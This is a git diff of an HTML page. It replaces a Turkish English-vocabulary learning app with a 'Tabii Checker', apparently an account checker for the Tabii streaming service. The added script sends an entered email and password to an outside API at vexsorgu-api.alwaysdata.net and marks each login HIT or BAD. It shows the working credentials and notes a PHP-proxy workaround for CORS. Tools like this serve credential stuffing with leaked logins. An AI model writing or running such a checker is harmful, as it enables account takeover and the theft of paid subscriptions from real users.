@@ -3,202 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kelime Projesi v7.0 - QR Sistem</title>
+    <title>Tabii Checker | Developer</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        /* Tasarım kodların aynı kalıyor, sadece fonksiyonel eklemeler yapıldı */
-        :root { --bg-dark: #121212; --card-grey: #181818; --inner-grey: #282828; --main-green: #1DB954; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
-        .list-container { max-width: 500px; margin: 0 auto; display: flex; flex-direction: column; gap: 12px; }
-        .word-item { background: white; padding: 18px; border-radius: 15px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        .word-text { font-size: 17px; font-weight: 600; flex-grow: 1; }
-        .word-tr { font-size: 14px; color: #888; margin-left: 8px; font-weight: 400; }
-        .listen-icon { font-size: 20px; color: var(--main-green); padding: 5px; cursor: pointer; }
-        #page-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
-        .content-container { width: 90%; max-width: 400px; display: flex; flex-direction: column; gap: 15px; }
-        .word-header { color: white; text-align: center; margin-bottom: 10px; }
-        .word-header h1 { margin: 0; font-size: 32px; font-weight: 800; display: inline-block; }
-        .word-header span { font-size: 18px; opacity: 0.6; margin-left: 10px; }
-        .media-row { display: flex; gap: 10px; width: 100%; }
-        .media-box { flex: 1; height: 150px; background: #333; border-radius: 20px; overflow: hidden; display: flex; align-items: center; justify-content: center; position: relative; }
-        .spotify-card { background: var(--card-grey); border-radius: 35px; padding: 30px; color: white; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .player-view { height: 180px; background: var(--inner-grey); border-radius: 20px; margin-bottom: 25px; overflow: hidden; position: relative; }
-        .player-view video { width: 100%; height: 100%; object-fit: contain; }
-        .progress-bar { width: 100%; height: 4px; background: #4f4f4f; border-radius: 2px; margin: 25px 0 15px 0; }
-        .bar-fill { width: 0%; height: 100%; background: white; border-radius: 2px; }
-        .controls { display: flex; justify-content: space-between; align-items: center; }
-        .btn-side { background: none; border: none; font-size: 22px; color: #b3b3b3; cursor: pointer; }
-        .btn-main { background: white; color: black; width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; border: none; cursor: pointer; }
-        .close-x { position: absolute; top: 20px; right: 20px; font-size: 26px; color: #b3b3b3; cursor: pointer; z-index: 1001; }
+        :root {
+            --bg: #0b0e14;
+            --card: #151b23;
+            --accent: #22c55e; /* Başarı için yeşil tonu */
+            --input-bg: #0d1117;
+            --border: #30363d;
+            --text: #c9d1d9;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .checker-card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+
+        .header { text-align: center; margin-bottom: 24px; }
+        .header h2 { margin: 0; color: #fff; font-size: 20px; }
+        .header span { font-size: 12px; color: #8b949e; letter-spacing: 1px; }
+
+        .input-box { margin-bottom: 16px; position: relative; }
+        .input-box i { position: absolute; left: 12px; top: 38px; color: #8b949e; }
+        
+        label { display: block; margin-bottom: 8px; font-size: 13px; color: #8b949e; }
+        
+        input {
+            width: 100%;
+            padding: 10px 10px 10px 35px;
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: #fff;
+            box-sizing: border-box;
+            transition: 0.2s;
+        }
+
+        input:focus { border-color: #58a6ff; outline: none; box-shadow: 0 0 0 3px rgba(88,166,255,0.1); }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: 0.2s;
+        }
+
+        button:hover { background: #2ea043; }
+        button:disabled { background: #23863680; cursor: not-allowed; }
+
+        #resultArea {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 6px;
+            display: none;
+            font-size: 14px;
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        .hit { background: rgba(35, 134, 54, 0.15); border: 1px solid #238636; color: #3fb950; }
+        .bad { background: rgba(248, 81, 73, 0.15); border: 1px solid #f85149; color: #f85149; }
     </style>
 </head>
 <body>
 
-    <h1 style="text-align:center">İngilizce 100 Kelime - QR Modu</h1>
-    <div class="list-container" id="list"></div>
-
-    <div id="page-overlay">
-        <div class="close-x" onclick="closeView()">✕</div>
-        <div class="content-container">
-            <div class="word-header">
-                <h1 id="txtEn">WORD</h1>
-                <span id="txtTr">(Türkçe)</span>
-            </div>
-            <div class="media-row">
-                <div class="media-box" id="boxImg"></div>
-                <div class="media-box" style="background:#1a1a1a; color:#555; font-size:12px; display:flex; align-items:center; justify-content:center;">
-                    <b>BURAK DEV</b>
-                </div>
-            </div>
-            <div class="spotify-card">
-                <div class="player-view" id="videoArea"></div>
-                <div class="progress-bar"><div class="bar-fill" id="pFill"></div></div>
-                <div class="controls">
-                    <button class="btn-side">🔀</button>
-                    <button class="btn-side" onclick="changeWord(-1)">⏮</button>
-                    <button id="pBtn" class="btn-main" onclick="playHandler()">▶</button>
-                    <button class="btn-side" onclick="changeWord(1)">⏭</button>
-                    <button class="btn-side">🔁</button>
-                </div>
-            </div>
-        </div>
+<div class="checker-card">
+    <div class="header">
+        <h2>TABII CHECKER</h2>
+        <span>BURAK | DEVELOPER</span>
     </div>
 
-    <script>
-        let currentIndex = 0;
-        
-        // Burak, kelime listen burada (Örnek olarak ilk 50'yi aldım, sen 100'e tamamlarsın)
-        const wordData = [
-            {en:"time", tr:"zaman", vid:"VID-20260326-WA0029.mp4"},
-            {en:"year", tr:"yıl", vid:"VID-20260326-WA0030.mp4"},
-            {en:"people", tr:"insanlar", vid:"VID-20260326-WA0031.mp4"},
-            {en:"way", tr:"yol", vid:"VID-20260326-WA0032.mp4"},
-            {en:"day", tr:"gün", vid:"VID-20260326-WA0033.mp4"},
-            {en:"man", tr:"adam", vid:"VID-20260326-WA0034.mp4"},
-            {en:"thing", tr:"şey", vid:"VID-20260326-WA0035.mp4"},
-            {en:"woman", tr:"kadın", vid:"VID-20260326-WA0036.mp4"},
-            {en:"life", tr:"hayat", vid:"VID-20260326-WA0037.mp4"},
-            {en:"child", tr:"çocuk", vid:"VID-20260313-WA0028.mp4"},
-            {en:"world", tr:"dünya", vid:"VID-20260326-WA0039.mp4"},
-            {en:"school", tr:"okul", vid:"VID-20260326-WA0040.mp4"},
-            {en:"state", tr:"durum", vid:"VID-20260326-WA0041.mp4"},
-            {en:"family", tr:"aile", vid:"VID-20260326-WA0042.mp4"},
-            {en:"student", tr:"öğrenci", vid:"VID-20260326-WA0043.mp4"},
-            {en:"group", tr:"grup", vid:"VID-20260326-WA0044.mp4"},
-            {en:"country", tr:"ülke", vid:"VID-20260326-WA0045.mp4"},
-            {en:"problem", tr:"sorun", vid:"VID-20260326-WA0046.mp4"},
-            {en:"hand", tr:"el", vid:"VID-20260326-WA0047.mp4"},
-            {en:"part", tr:"parça", vid:"VID-20260326-WA0048.mp4"},
-            {en:"place", tr:"yer", vid:"VID-20260326-WA0049.mp4"},
-            {en:"case", tr:"durum", vid:"VID-20260326-WA0050.mp4"},
-            {en:"week", tr:"hafta", vid:"VID-20260326-WA0051.mp4"},
-            {en:"company", tr:"şirket", vid:"VID-20260326-WA0052.mp4"},
-            {en:"system", tr:"sistem", vid:"VID-20260326-WA0053.mp4"},
-            {en:"word", tr:"kelime", vid:"VID-20260326-WA0054.mp4"},
-            {en:"work", tr:"çalışmak", vid:"VID-20260326-WA0055.mp4"},
-            {en:"use", tr:"kullanmak", vid:"VID-20260326-WA0056.mp4"},
-            {en:"make", tr:"yapmak", vid:"VID-20260326-WA0057.mp4"},
-            {en:"take", tr:"almak", vid:"VID-20260326-WA0058.mp4"},
-            {en:"give", tr:"vermek", vid:"VID-20260326-WA0059.mp4"},
-            {en:"come", tr:"gelmek", vid:"VID-20260326-WA0060.mp4"},
-            {en:"look", tr:"bakmak", vid:"VID-20260326-WA0061.mp4"},
-            {en:"want", tr:"istemek", vid:"VID-20260326-WA0062.mp4"},
-            {en:"find", tr:"bulmak", vid:"VID-20260326-WA0063.mp4"},
-            {en:"tell", tr:"söylemek", vid:"VID-20260326-WA0064.mp4"},
-            {en:"ask", tr:"sormak", vid:"VID-20260326-WA0065.mp4"},
-            {en:"try", tr:"denemek", vid:"VID-20260326-WA0066.mp4"},
-            {en:"need", tr:"ihtiyaç", vid:"VID-20260326-WA0067.mp4"},
-            {en:"feel", tr:"hissetmek", vid:"VID-20260326-WA0068.mp4"},
-            {en:"become", tr:"olmak", vid:"VID-20260326-WA0069.mp4"},
-            {en:"leave", tr:"ayrılmak", vid:"VID-20260314-WA0000.mp4"},
-            {en:"call", tr:"aramak", vid:"VID-20260313-WA0138.mp4"},
-            {en:"keep", tr:"tutmak", vid:"VID-20260326-WA0072.mp4"},
-            {en:"start", tr:"başlamak", vid:"VID-20260326-WA0073.mp4"},
-            {en:"seem", tr:"görünmek", vid:"VID-20260326-WA0074.mp4"},
-            {en:"help", tr:"yardım", vid:"VID-20260326-WA0075.mp4"},
-            {en:"talk", tr:"konuşmak", vid:"VID-20260313-WA0139.mp4"},
-            {en:"turn", tr:"dönmek", vid:"VID-20260326-WA0077.mp4"},
-            {en:"begin", tr:"başlamak", vid:"VID-20260326-WA0078.mp4"}
-        ];
+    <div class="input-box">
+        <label>E-posta Adresi</label>
+        <i class="fas fa-envelope"></i>
+        <input type="text" id="mail" placeholder="email@example.com">
+    </div>
 
-        // Listeyi oluştur
-        const list = document.getElementById('list');
-        wordData.forEach((w, i) => {
-            let item = document.createElement('div');
-            item.className = 'word-item';
-            item.onclick = () => openView(i, true); // true: URL'yi de güncelle demek
-            item.innerHTML = `
-                <div class="word-text"><b>${i + 1}.</b> ${w.en} <span class="word-tr">${w.tr}</span></div>
-                <span class="listen-icon" onclick="event.stopPropagation(); tts('${w.en}')">🔊</span>
-            `;
-            list.appendChild(item);
-        });
+    <div class="input-box">
+        <label>Şifre</label>
+        <i class="fas fa-lock"></i>
+        <input type="password" id="pass" placeholder="••••••••">
+    </div>
 
-        // Sayfa ilk yüklendiğinde URL'de ?kelime=... var mı diye bak
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const wordParam = urlParams.get('kelime'); // URL'den kelimeyi al
-            
-            if (wordParam) {
-                const index = wordData.findIndex(w => w.en.toLowerCase() === wordParam.toLowerCase());
-                if (index !== -1) {
-                    openView(index, false); // Sayfa açılışında direkt kelimeyi göster
-                }
-            }
-        };
+    <button id="sorguBtn" onclick="calistir()">Sorguyu Başlat</button>
 
-        function openView(index, updateUrl) {
-            currentIndex = index;
-            const w = wordData[currentIndex];
-            
-            // Eğer QR ile gelmediyse, URL'yi güncelle (tarayıcı geçmişi için)
-            if(updateUrl) {
-                const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?kelime=' + w.en;
-                window.history.pushState({path:newUrl},'',newUrl);
+    <div id="resultArea"></div>
+</div>
+
+<script>
+    async function calistir() {
+        const mail = document.getElementById('mail').value;
+        const pass = document.getElementById('pass').value;
+        const btn = document.getElementById('sorguBtn');
+        const res = document.getElementById('resultArea');
+
+        if(!mail || !pass) {
+            alert("Lütfen tüm alanları doldur!");
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Kontrol Ediliyor...';
+        res.style.display = 'none';
+
+        // Senin API URL'in
+        const apiUrl = `https://vexsorgu-api.alwaysdata.net/api/tabiichecker.php?mail=${encodeURIComponent(mail)}&password=${encodeURIComponent(pass)}`;
+
+        try {
+            // Not: Eğer Alwaysdata CORS engeli koyduysa tarayıcıda çalışmayabilir.
+            // Bu durumda bir PHP dosyası üzerinden "file_get_contents" ile çekmek gerekebilir.
+            const response = await fetch(apiUrl);
+            const data = await response.json();
+
+            res.style.display = 'block';
+
+            // API'den dönen veriye göre (Success/Fail kontrolü)
+            // Genelde bu tarz API'ler "status" veya "message" döndürür.
+            if (data.status === true || data.status === "success" || data.message?.includes("Başarılı")) {
+                res.className = 'hit';
+                res.innerHTML = `<strong>DURUM:</strong> HIT (Giriş Başarılı)<br>
+                                 <strong>DATA:</strong> ${mail}:${pass}<br>
+                                 <strong>DETAY:</strong> ${JSON.stringify(data.bilgi || data.message || 'Abonelik Aktif')}`;
+            } else {
+                res.className = 'bad';
+                res.innerHTML = `<strong>DURUM:</strong> BAD (Hatalı/Abonelik Yok)<br>
+                                 <strong>MESAJ:</strong> ${data.message || 'Giriş Başarısız'}`;
             }
 
-            document.getElementById('txtEn').innerText = w.en.toUpperCase();
-            document.getElementById('txtTr').innerText = `(${w.tr})`;
-            
-            if(w.vid) {
-                document.getElementById('videoArea').innerHTML = `<video id="vPlayer" autoplay loop playsinline ontimeupdate="updateProgress()"><source src="videolar/${w.vid}" type="video/mp4"></video>`;
-                document.getElementById('pBtn').innerText = "⏸";
-            }
-            document.getElementById('page-overlay').style.display = 'flex';
-            tts(w.en);
+        } catch (error) {
+            res.style.display = 'block';
+            res.className = 'bad';
+            res.innerHTML = `<strong>HATA:</strong> API'ye bağlanılamadı veya CORS engeli var.<br>
+                             <small>Konsolu (F12) kontrol et.</small>`;
+            console.error("API Error:", error);
+        } finally {
+            btn.disabled = false;
+            btn.innerHTML = 'Sorguyu Başlat';
         }
+    }
+</script>
 
-        function closeView() {
-            document.getElementById('page-overlay').style.display = 'none';
-            document.getElementById('videoArea').innerHTML = '';
-            // Kapatınca URL'yi temizle (Ana listeye dönmüş gibi)
-            const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
-            window.history.pushState({path:cleanUrl},'',cleanUrl);
-            window.speechSynthesis.cancel();
-        }
-
-        // Diğer standart fonksiyonlar...
-        function updateProgress() {
-            const v = document.getElementById('vPlayer');
-            if(v && v.duration) document.getElementById('pFill').style.width = (v.currentTime / v.duration) * 100 + "%";
-        }
-        function playHandler() {
-            const v = document.getElementById('vPlayer');
-            if(v) {
-                if (v.paused) { v.play(); document.getElementById('pBtn').innerText = "⏸"; }
-                else { v.pause(); document.getElementById('pBtn').innerText = "▶"; }
-            }
-            tts(wordData[currentIndex].en);
-        }
-        function changeWord(dir) {
-            currentIndex = (currentIndex + dir + wordData.length) % wordData.length;
-            openView(currentIndex, true);
-        }
-        function tts(s) {
-            window.speechSynthesis.cancel();
-            const u = new SpeechSynthesisUtterance(s);
-            u.lang = 'en-US';
-            window.speechSynthesis.speak(u);
-        }
-    </script>
 </body>
 </html>
